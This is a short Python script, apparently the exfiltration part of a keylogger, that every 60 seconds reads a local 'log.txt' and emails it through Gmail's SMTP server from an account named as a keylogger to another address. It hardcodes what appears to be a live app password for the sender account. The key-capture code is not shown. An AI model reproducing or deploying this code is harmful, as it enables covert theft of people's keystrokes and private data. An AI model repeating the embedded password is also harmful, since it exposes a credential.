import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_log():
    msg = MIMEMultipart()
    password = 'ztesjhrfrmxkthji'
    msg['From'] = "sebaskeylogger123451@gmail.com"
    msg['To'] = "sebaff.123451@gmail.com"
    msg['Subject'] = "Data Log"
    msg.attach(MIMEText(open('log.txt').read()))

    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
    except:
        print("Error al enviar la información")

while True:
    send_log()
    time.sleep(60)